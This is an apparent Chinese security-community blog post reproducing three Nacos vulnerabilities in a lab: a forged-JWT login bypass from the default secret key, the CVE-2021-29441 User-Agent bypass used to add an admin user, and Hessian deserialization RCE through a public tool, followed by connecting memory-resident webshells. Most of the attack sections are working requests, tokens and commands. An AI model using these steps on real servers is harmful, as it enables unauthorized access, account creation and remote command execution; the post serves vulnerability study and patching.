#  漏洞合集 | Nacos系列多漏洞复现

原创 0u0zzz  [ SecHub网络安全社区 ](javascript:void\(0\);)

**SecHub网络安全社区** ![]()

微信号 secevery0x01

功能介绍
隶属于SecHub网络安全社区，致力于研究渗透测试、红蓝对抗、应急响应、实战案例、钓鱼社工、和漏洞分析，定期分享实战案例、技术教程、安全工具等前沿网络安全资源。

____

___发表于_

收录于合集 #漏洞复现 10个

**点击蓝字 关注我们**

![]()

 **免责声明**

本文发布的工具和脚本，仅用作测试和学习研究，禁止用于商业用途，不能保证其合法性，准确性，完整性和有效性，请根据情况自行判断。

如果任何单位或个人认为该项目的脚本可能涉嫌侵犯其权利，则应及时通知并提供身份证明，所有权证明，我们将在收到认证文件后删除相关内容。

文中所涉及的技术、思路及工具等相关知识仅供安全为目的的学习使用，任何人不得将其应用于非法用途及盈利等目的，间接使用文章中的任何工具、思路及技术，我方对于由此引起的法律后果概不负责。

 **添加星标不迷路  
**

由于公众号推送规则改变，微信头条公众号信息会被折叠，为了避免错过公众号推送，请大家动动手指设置“星标”，设置之后就可以和从前一样收到推送啦![](https://res.wx.qq.com/t/wx_fed/we-
emoji/res/v1.3.10/assets/newemoji/2_04.png)

# 一、简介

nacos是阿里巴巴的一个开源项目，旨在帮助构建云原生应用程序和微服务平台

# 二、环境搭建

下载文件，该文件为gz压缩文件

    
    
    wget https://github.com/alibaba/nacos/releases/download/2.2.0/nacos-server-2.2.0.tar.gz  
    

转移目录

    
    
    cd nacos/bin  
    

运行nacos

    
    
    ./startup.sh -m standalone  
    

关闭nacos

    
    
    ./shutdown.sh  
    

![]()

访问url：

    
    
    http://192.168.1.128:8848/nacos/#/login  
    

![]()

默认账号密码

    
    
    nacos/nacos  
    

# 三、nacos身份绕过漏洞

## 原理

nacos在默认情况下未对token.secret.key进行修改，导致攻击者可以绕过密钥认证进入后台。

也就是nacos的密钥是有默认值的，其鉴权是JWT,我们知道密钥即可伪造一个恶意的JWT令牌来攻击

对于jwt加密 其实就是用了base64 密钥是写死在源码里面的 所以直接可以用jwt伪造攻击

对应就是数据包的`accesstoken`

## 影响版本

    
    
    0.1.0 <= Nacos <= 2.2.0  
    

## 第一种复现

访问url:

    
    
    http://192.168.1.128:8848/nacos/#/login  
    

登陆抓包

![]()

拦截返回包填写poc

![]()

## POC

    
    
    HTTP/1.1 200  
    Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTYxODEyMzY5N30.nyooAL4OMdiByXocu8kL1ooXd1IeKj6wQZwIH8nmcNA  
    Content-Type: application/json; charset=utf-8  
    Date: Tue, 14 Mar 2023 16:34:47 GMT  
    Content-Length: 206  
      
    {  
     "accessToken": "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTYxODEyMzY5N30.nyooAL4OMdiByXocu8kL1ooXd1IeKj6wQZwIH8nmcNA",  
     "tokenTtl": 18000,  
     "globalAdmin": false,  
     "username": "nacos"  
    }  
    

成功登录后台

![]()

## 修复建议

升级到最新版`nacos`

修改`token.secret.key`的值

## 参考：

    
    
    https://www.cnblogs.com/0vers1eep/p/17226608.html  
    https://mp.weixin.qq.com/s?src=11&timestamp=1688698851&ver=4635&signature=9oSwwPFu8Rj0T9S4Y2wphhDWoF*3swqweCW*kX1YPjTEN3VJvHo51RDv6WlMdyZrFcNpsj*AMXN3p7w2pGiIb*FP5Unnkb-8LUfHFEcWBXBUYf9QdXsPb7mM2ayaAhaq&new=1  
    

# 四、Nacos 身份验证绕过漏洞（CVE-2021-29441）

## 原理

在`<1.4.1`及更早版本的`Nacos`中，当配置文件使用身份验证（`Dnacos.core.auth.enabled=true`）时候，会判断请求ua是否为`"Nacos-
Server"`，如果是的话则不进行任何认证。

## 影响版本

    
    
    nacos<1.4.1  
    

## 复现

在vulhub上搭建环境

    
    
    cd /root/桌面/docker/vulhub/nacos/CVE-2021-29441/  
    docker-compose up -d  
    

开启burp抓包

    
    
    http://192.168.111.128:8848/nacos/v1/auth/users?pageNo=1&pageSize=9  
    

把UA改成`Nacos-Server`

![]()

1.成功访问，绕过鉴权，返回用户列表数据

![]()

2.绕过鉴权 添加新用户

请求行改成：

    
    
    POST /nacos/v1/auth/users?username=hglight&password=hglight HTTP/1.1  
    

ua改成：`Nacos-Server`

![]()

成功添加一个`hglight/hglight`的用户

3.再次查看用户列表

![]()

4.登录

![]()

# 五、nacos Hessian反序列化

## 原理

nacos默认的7848端口是用来处理集群模式下raft协议的通信，该端口的服务在处理部分jraft请求的时候使用hessian传输协议进行反序列化过滤不严，导致rce

## 影响版本

nacos 1.x在单机模式下默认不开放7848端口，但是集群模式下受影响。

2.x版本无论单机还是集群均开放7848端口

主要受影响的是7848端口的Jraft服务。

受影响版本

  * 1.4.0 <= Nacos < 1.4.6

  * 2.0.0 <= Nacos < 2.2.3

不受影响版本

  * Nacos < 1.4.0

  * 1.4.6 <= Nacos < 2.0.0

  * Nacos >= 2.2.3

## 复现

利用nacos2.2.0的环境

![]()

使用github上面的工具

    
    
    https://github.com/c0olw/NacosRce/releases/tag/v0.5  
    

![]()

    
    
    java -jar NacosRce.jar  http://192.168.1.128:8848/nacos/#/login  7848 "whoami"  
    

我这里试的 只有前几次 能利用成功 后面好像都不咋行

![]()

## 冰蝎3.0连接

需要设置请求头`x-client-data:rebeyond`

设置`Referer:https://www.google.com/`

路径随意

密码`rebeyond`

![]()

## cmd内存马

需要设置请求头`x-client-data:cmd`

设置`Referer:https://www.google.com/`

请求头cmd:要执行的命令

![]()

## 参考：

    
    
    https://y4er.com/posts/nacos-hessian-rce/

  

  

欢迎关注SecHub网络安全社区，SecHub网络安全社区目前邀请式注册，邀请码获取见公众号菜单【邀请码】

 **#**

  

 **企业简介    **

  

 **赛克艾威 - 专注政企安全服务**

 **  
**

       北京赛克艾威科技有限公司（简称：赛克艾威），成立于2016年9月，具有中国网络安全审查技术与认证中心安全风险评估服务三级资质CCRC，信息安全保障人员资质CISAW（安全评估专家级）。

  

安全评估|渗透测试|漏洞扫描|安全巡检

代码审计|钓鱼演练|应急响应|安全运维

重大时刻安保|企业安全培训

![]()

 **联系方式**

电话｜010-86460828

官网｜https://sechub.com.cn

![]()

 **关注我们**

![]()![]()![]()

 **公众号：** SecHub网络安全社区

 **哔哩号：** SecHub官方账号

  

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

